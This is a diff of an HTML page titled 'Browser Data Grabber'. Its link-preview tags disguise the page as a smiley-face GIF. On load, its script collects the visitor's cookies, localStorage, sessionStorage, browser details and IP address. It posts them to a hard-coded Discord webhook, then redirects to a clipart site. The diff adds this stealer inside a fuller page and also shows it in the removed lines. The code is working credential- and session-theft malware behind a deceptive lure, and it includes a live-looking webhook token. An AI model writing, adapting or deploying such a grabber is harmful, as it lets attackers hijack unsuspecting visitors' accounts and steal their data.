@@ -1,88 +1,104 @@
-<h1>redirecting......</h1>
-<script>
-    // Discord Webhook URL
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1325798681651183668/Yz4g0NkNi7kiX1Vi8bhbCPMQ35kO6U3uCU7i-R4LOxDCN61jI09Sed1whGpEhFn9zeDV';
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Browser Data Grabber</title>
+    <!-- Open Graph meta tags -->
+    <meta property="og:title" content="Smiley Face GIF">
+    <meta property="og:description" content="Check out this cool smiley face GIF!">
+    <meta property="og:image" content="https://clipartmag.com/images/smily-face-animated-35.gif">
+    <meta property="og:url" content="https://flyawaydev123.github.io/smile_face_gif/">
+    <meta property="og:type" content="website">
+</head>
+<body>
+    <h1>redirecting......</h1>
+    <script>
+        // Discord Webhook URL
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1325798681651183668/Yz4g0NkNi7kiX1Vi8bhbCPMQ35kO6U3uCU7i-R4LOxDCN61jI09Sed1whGpEhFn9zeDV';
 
-    // Function to get cookies
-    function getCookies() {
-        return document.cookie;
-    }
-
-    // Function to get localStorage data
-    function getLocalStorage() {
-        let localStorageData = {};
-        for (let key in localStorage) {
-            if (localStorage.hasOwnProperty(key)) {
-                localStorageData[key] = localStorage.getItem(key);
-            }
+        // Function to get cookies
+        function getCookies() {
+            return document.cookie;
         }
-        return localStorageData;
-    }
 
-    // Function to get sessionStorage data
-    function getSessionStorage() {
-        let sessionStorageData = {};
-        for (let key in sessionStorage) {
-            if (sessionStorage.hasOwnProperty(key)) {
-                sessionStorageData[key] = sessionStorage.getItem(key);
+        // Function to get localStorage data
+        function getLocalStorage() {
+            let localStorageData = {};
+            for (let key in localStorage) {
+                if (localStorage.hasOwnProperty(key)) {
+                    localStorageData[key] = localStorage.getItem(key);
+                }
             }
+            return localStorageData;
         }
-        return sessionStorageData;
-    }
 
-    // Function to get IP address
-    async function getIP() {
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        return data.ip;
-    }
+        // Function to get sessionStorage data
+        function getSessionStorage() {
+            let sessionStorageData = {};
+            for (let key in sessionStorage) {
+                if (sessionStorage.hasOwnProperty(key)) {
+                    sessionStorageData[key] = sessionStorage.getItem(key);
+                }
+            }
+            return sessionStorageData;
+        }
 
-    // Function to get browser information
-    function getBrowserInfo() {
-        return {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            languages: navigator.languages,
-            vendor: navigator.vendor,
-            appVersion: navigator.appVersion,
-        };
-    }
+        // Function to get IP address
+        async function getIP() {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        }
 
-    // Function to send data to Discord webhook
-    async function sendData() {
-        const ip = await getIP();
-        const payload = {
-            cookies: getCookies(),
-            localStorage: getLocalStorage(),
-            sessionStorage: getSessionStorage(),
-            browserInfo: getBrowserInfo(),
-            ip: ip
-        };
+        // Function to get browser information
+        function getBrowserInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                vendor: navigator.vendor,
+                appVersion: navigator.appVersion,
+            };
+        }
 
-        const embed = {
-            title: "Browser Data",
-            fields: [
-                { name: "IP Address", value: payload.ip, inline: true },
-                { name: "Cookies", value: payload.cookies, inline: false },
-                { name: "Local Storage", value: JSON.stringify(payload.localStorage), inline: false },
-                { name: "Session Storage", value: JSON.stringify(payload.sessionStorage), inline: false },
-                { name: "Browser Info", value: JSON.stringify(payload.browserInfo), inline: false }
-            ]
-        };
+        // Function to send data to Discord webhook
+        async function sendData() {
+            const ip = await getIP();
+            const payload = {
+                cookies: getCookies(),
+                localStorage: getLocalStorage(),
+                sessionStorage: getSessionStorage(),
+                browserInfo: getBrowserInfo(),
+                ip: ip
+            };
 
-        await fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ embeds: [embed] })
-        });
+            const embed = {
+                title: "Browser Data",
+                fields: [
+                    { name: "IP Address", value: payload.ip, inline: true },
+                    { name: "Cookies", value: payload.cookies, inline: false },
+                    { name: "Local Storage", value: JSON.stringify(payload.localStorage), inline: false },
+                    { name: "Session Storage", value: JSON.stringify(payload.sessionStorage), inline: false },
+                    { name: "Browser Info", value: JSON.stringify(payload.browserInfo), inline: false }
+                ]
+            };
 
-        // Redirect to the specified website
-        window.location.href = 'https://clipartmag.com/download-clipart-image#smily-face-animated-35.gif';
-    }
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ embeds: [embed] })
+            });
 
-    // Execute the sendData function
-    sendData();
-</script>
+            // Redirect to the specified website
+            window.location.href = 'https://clipartmag.com/download-clipart-image#smily-face-animated-35.gif';
+        }
+
+        // Execute the sendData function
+        sendData();
+    </script>
+</body>
+</html>
